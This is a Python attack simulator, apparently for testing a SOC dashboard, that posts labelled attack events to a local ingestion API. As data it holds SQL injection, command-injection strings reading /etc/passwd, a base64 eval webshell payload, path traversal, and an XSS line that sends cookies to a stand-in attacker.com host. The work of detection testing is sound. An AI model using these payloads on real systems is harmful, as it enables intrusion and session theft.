"""
Custom Attack Dispatcher for Enterprise 24/7 SOC Testing.
Allows simulating custom attacks, malicious IP traffic, brute force sequences, SQLi, XSS, RCE, 
and path traversal to verify real-time SIEM ingestion and SOAR mitigation in the SOC Dashboard.
"""
import sys
import json
import time
import random
import argparse
import urllib.request
import urllib.error

API_URL = "http://127.0.0.1:8000/api/ingest/nginx"

# Color formatting for terminal output
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def attack_gap_delay(min_sec: float = 3.0, max_sec: float = 5.0):
    wait_time = round(random.uniform(min_sec, max_sec), 1)
    time.sleep(wait_time)

def send_attack(attack_type: str, uri: str, payload: str, client_ip: str = "185.220.101.99", user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", method: str = None):
    if method is None:
        method = "POST" if payload else "GET"

    body = {
        "client_ip": client_ip,
        "method": method,
        "uri": uri,
        "user_agent": user_agent,
        "payload": payload,
        "attack_type": attack_type
    }
    
    req = urllib.request.Request(API_URL, data=json.dumps(body).encode('utf-8'), headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=15) as res:
            data = json.loads(res.read().decode('utf-8'))
            evt = data.get("event", {})
            
            sev_color = RED if evt.get("severity") in ["High", "Critical"] else YELLOW if evt.get("severity") == "Medium" else CYAN
            blocked_status = f"{RED}{BOLD}YES (IP Blocked){RESET}" if evt.get("blocked") else f"{GREEN}No (Patched/Monitored){RESET}"
            email_status = f"{RED}{BOLD}Dispatched to jesinmilesh@gmail.com{RESET}" if evt.get("email_sent") else "None"
            
            country_str = evt.get('country', 'Unknown').encode('ascii', 'ignore').decode('ascii').strip() or evt.get('country', 'Unknown')
            print(f"\n{BOLD}[+] INGESTED ATTACK:{RESET} {CYAN}{evt.get('attack_type', attack_type)}{RESET}")
            print(f"    - Endpoint URI : {uri}")
            print(f"    - Client IP    : {client_ip} ({country_str})")
            print(f"    - Abuse Score  : {evt.get('abuse_score', 0)} / 100")
            print(f"    - Severity     : {sev_color}{evt.get('severity')} (Score: {evt.get('score')}/10){RESET}")
            print(f"    - Auto-Blocked : {blocked_status}")
            print(f"    - Alert Email  : {email_status}")
            print(f"    - Actions Taken: {', '.join(evt.get('actions_taken', []))}")
            return evt
    except urllib.error.URLError as e:
        print(f"\n{RED}[!] Connection Error:{RESET} Could not connect to SOC backend at {API_URL}.")
        print(f"    Please ensure FastAPI backend is running (`uvicorn main:app --reload`).")
        print(f"    Details: {e}")
        return None
    except Exception as e:
        print(f"\n{RED}[!] Dispatch Error:{RESET} {e}")
        return None

def simulate_brute_force(client_ip: str = "103.251.170.19", attempts: int = 6):
    """
    Simulates a rapid multi-attempt brute force login attack.
    Triggers CorrelationEngine frequency thresholds to convert events from 'Failed Login' to 'Brute Force Attack'.
    """
    print(f"\n==================================================================")
    print(f" [*] SIMULATING BRUTE FORCE ATTACK SEQUENCE ({attempts} Rapid Login Attempts)")
    print(f"     Target IP: {client_ip} (Credential Stuffing Proxy, Hanoi Vietnam)")
    print(f"==================================================================")
    
    usernames = ["admin", "root", "administrator", "sysadmin", "jesin", "security_admin"]
    for i in range(1, attempts + 1):
        user = usernames[(i - 1) % len(usernames)]
        print(f"\n Attempt #{i}/{attempts}: Sending failed login for user '{user}'...")
        evt = send_attack(
            attack_type="Failed Login",
            uri="/login.php",
            payload=f"action=login&username={user}&password=wrong_password_{i * 111}",
            client_ip=client_ip,
            user_agent="Mozilla/5.0 (X11; Linux x86_64) CredentialStuffingBot/2.4",
            method="POST"
        )
        time.sleep(1.0)

def simulate_malicious_ip():
    """
    Simulates inbound traffic originating from known malicious IPs (Tor Exit Nodes, C2 Command Servers).
    """
    print(f"\n==================================================================")
    print(f" [*] SIMULATING KNOWN MALICIOUS IP TRAFFIC & BOTNET C2 REQUESTS")
    print(f"==================================================================")
    
    # 1. Tor Exit Node / Botnet C2 Server
    send_attack(
        attack_type="Malicious IP Activity",
        uri="/api/v1/telemetry",
        payload="c2_heartbeat_ping",
        client_ip="185.220.101.5", # Known Tor Exit Node / Botnet Server in Russia (Abuse Score: 98)
        user_agent="Mozilla/5.0 (Tor/11.0.1; Botnet/V4)",
        method="POST"
    )
    
    attack_gap_delay(3.0, 5.0)

    # 2. RCE Exploit Launcher Host
    send_attack(
        attack_type="Malicious IP Traffic",
        uri="/admin/shell.php",
        payload="eval(base64_decode('c3lzdGVtKCdpZCcpOzE='));",
        client_ip="193.142.146.210", # Known RCE Exploit Launcher in Netherlands (Abuse Score: 99)
        user_agent="ExploitFramework/1.0",
        method="POST"
    )

def run_all_simulations():
    """
    Executes a complete suite of attack vectors for comprehensive SOC testing.
    """
    print(f"{BOLD}=================================================================={RESET}")
    print(f"{BOLD}   ENTERPRISE SOC ATTACK SIMULATOR - FULL SUITE EXECUTION        {RESET}")
    print(f"{BOLD}=================================================================={RESET}")
    
    # 1. SQL Injection
    print(f"\n---> [1/7] Dispatching SQL Injection (SQLi) Attack...")
    send_attack("SQL Injection (SQLi)", "/login.php", "username=admin' OR 1=1 --&password=foo", client_ip="198.51.100.77")
    attack_gap_delay(3.0, 5.0)

    # 2. Command Injection (RCE)
    print(f"\n---> [2/7] Dispatching Command Injection (RCE) Attack...")
    send_attack("Command Injection (RCE)", "/admin/system.php?cmd=id;", "cat /etc/passwd; id; whoami;", client_ip="193.142.146.88")
    attack_gap_delay(3.0, 5.0)

    # 3. Known Malicious IP Traffic
    print(f"\n---> [3/7] Dispatching Malicious IP Traffic...")
    simulate_malicious_ip()
    attack_gap_delay(3.0, 5.0)

    # 4. Multi-Attempt Brute Force Attack
    print(f"\n---> [4/7] Dispatching Multi-Attempt Brute Force Attack Sequence...")
    simulate_brute_force(client_ip="103.251.170.19", attempts=6)
    attack_gap_delay(3.0, 5.0)

    # 5. Cross-Site Scripting (XSS)
    print(f"\n---> [5/7] Dispatching Cross-Site Scripting (XSS) Attack...")
    send_attack("Cross-Site Scripting (XSS)", "/contact.php", "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>", client_ip="45.154.255.88")
    attack_gap_delay(3.0, 5.0)

    # 6. Path Traversal / LFI
    print(f"\n---> [6/7] Dispatching Path Traversal / LFI Attack...")
    send_attack("Path Traversal", "/download.php?file=../../../../etc/passwd", "../../../../etc/passwd", client_ip="203.0.113.15")
    attack_gap_delay(3.0, 5.0)

    # 7. Vulnerability Scanner & Reconnaissance
    print(f"\n---> [7/7] Dispatching Vulnerability Scanner & Recon Probes...")
    send_attack("Scanner Detection", "/admin/config.php", "nikto_scan_probe", client_ip="198.51.100.44", user_agent="Nikto/2.1.6 (Evasion:2/3)")
    attack_gap_delay(2.0, 3.0)
    send_attack("Admin Enumeration", "/.env", "", client_ip="194.26.29.112", user_agent="Mozilla/5.0 ReconBot/1.0")

    print(f"\n{BOLD}=================================================================={RESET}")
    print(f"{GREEN}{BOLD} [OK] ALL ATTACK VECTOR SIMULATIONS COMPLETED SUCCESSFULLY.{RESET}")
    print(f"     Verify results live on the SOC Dashboard at http://localhost:5173/")
    print(f"{BOLD}=================================================================={RESET}\n")

def interactive_menu():
    while True:
        print(f"\n{BOLD}--------------------------------------------------{RESET}")
        print(f"{BOLD}   CUSTOM ATTACK SIMULATOR - SELECT AN OPTION    {RESET}")
        print(f"{BOLD}--------------------------------------------------{RESET}")
        print(" [1] Run Full Attack Suite (All Attack Vectors)")
        print(" [2] Simulating Known Malicious IP Traffic (Tor Exit / C2)")
        print(" [3] Simulate Brute Force Attack Sequence (6 Failed Logins)")
        print(" [4] Simulate SQL Injection (SQLi)")
        print(" [5] Simulate Command Injection (RCE)")
        print(" [6] Simulate Cross-Site Scripting (XSS)")
        print(" [7] Simulate Path Traversal / Local File Inclusion")
        print(" [8] Simulate Vulnerability Scanner (Nikto) & Recon")
        print(" [9] Dispatch Custom Attack (Manual Input)")
        print(" [0] Exit")
        print("--------------------------------------------------")
        
        choice = input("Enter choice [0-9]: ").strip()
        if choice == "1":
            run_all_simulations()
        elif choice == "2":
            simulate_malicious_ip()
        elif choice == "3":
            simulate_brute_force()
        elif choice == "4":
            send_attack("SQL Injection (SQLi)", "/login.php", "username=admin' OR 1=1 --", client_ip="198.51.100.77")
        elif choice == "5":
            send_attack("Command Injection (RCE)", "/admin/system.php?cmd=id;", "cat /etc/passwd; id;", client_ip="193.142.146.88")
        elif choice == "6":
            send_attack("Cross-Site Scripting (XSS)", "/contact.php", "<script>alert('XSS_Test')</script>", client_ip="45.154.255.88")
        elif choice == "7":
            send_attack("Path Traversal", "/download.php?file=../../../../etc/passwd", "../../../../etc/passwd", client_ip="203.0.113.15")
        elif choice == "8":
            send_attack("Scanner Detection", "/admin/config.php", "nikto_scan_probe", client_ip="198.51.100.44", user_agent="Nikto/2.1.6")
        elif choice == "9":
            att_type = input("Attack Type (e.g. SQL Injection): ").strip() or "Custom Test Attack"
            uri = input("Target URI (e.g. /login.php): ").strip() or "/test.php"
            payload = input("Payload (or press Enter): ").strip()
            ip = input("Client IP (e.g. 185.220.101.5): ").strip() or "185.220.101.99"
            agent = input("User Agent (press Enter for default): ").strip() or "Mozilla/5.0"
            send_attack(att_type, uri, payload, client_ip=ip, user_agent=agent)
        elif choice == "0":
            print("Exiting simulator. Goodbye!")
            sys.exit(0)
        else:
            print("Invalid selection. Please try again.")

def main():
    parser = argparse.ArgumentParser(description="Custom Attack Dispatcher for SOC Dashboard Manual Testing")
    parser.add_argument("--attack", choices=["all", "sqli", "rce", "malicious_ip", "brute_force", "xss", "path_traversal", "scanner", "custom"], help="Specify attack type to execute")
    parser.add_argument("--ip", default="185.220.101.99", help="Client IP address for custom attack")
    parser.add_argument("--uri", default="/test.php", help="Target URI endpoint for custom attack")
    parser.add_argument("--payload", default="", help="Payload string for custom attack")
    parser.add_argument("--agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64)", help="User Agent string")
    parser.add_argument("--type", default="Custom Attack", help="Name of custom attack vector")
    parser.add_argument("--all", action="store_true", help="Run full attack suite")
    parser.add_argument("--interactive", action="store_true", help="Launch interactive selection menu")
    
    args = parser.parse_args()

    if args.all or args.attack == "all":
        run_all_simulations()
    elif args.attack == "sqli":
        send_attack("SQL Injection (SQLi)", "/login.php", "username=admin' OR 1=1 --", client_ip="198.51.100.77")
    elif args.attack == "rce":
        send_attack("Command Injection (RCE)", "/admin/system.php?cmd=id;", "cat /etc/passwd; id;", client_ip="193.142.146.88")
    elif args.attack == "malicious_ip":
        simulate_malicious_ip()
    elif args.attack == "brute_force":
        simulate_brute_force()
    elif args.attack == "xss":
        send_attack("Cross-Site Scripting (XSS)", "/contact.php", "<script>alert('XSS_Test')</script>", client_ip="45.154.255.88")
    elif args.attack == "path_traversal":
        send_attack("Path Traversal", "/download.php?file=../../../../etc/passwd", "../../../../etc/passwd", client_ip="203.0.113.15")
    elif args.attack == "scanner":
        send_attack("Scanner Detection", "/admin/config.php", "nikto_scan_probe", client_ip="198.51.100.44", user_agent="Nikto/2.1.6")
    elif args.attack == "custom":
        send_attack(args.type, args.uri, args.payload, client_ip=args.ip, user_agent=args.agent)
    elif args.interactive:
        interactive_menu()
    else:
        # Default behavior if executed without arguments: Run full suite
        run_all_simulations()

if __name__ == "__main__":
    main()
